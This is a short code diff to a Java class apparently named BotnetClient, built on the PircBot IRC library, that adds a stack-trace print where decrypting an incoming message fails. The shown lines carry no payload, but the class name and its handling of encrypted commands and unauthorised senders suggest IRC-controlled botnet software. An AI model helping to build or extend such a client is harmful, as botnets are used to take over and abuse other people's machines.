@@ -156,6 +156,7 @@ public class BotnetClient extends PircBot {
 					System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
 				}
 			} catch (Exception e) {
+				e.printStackTrace();
 				System.out.println("There was problems decrypting the message");
 			}
 		} else {
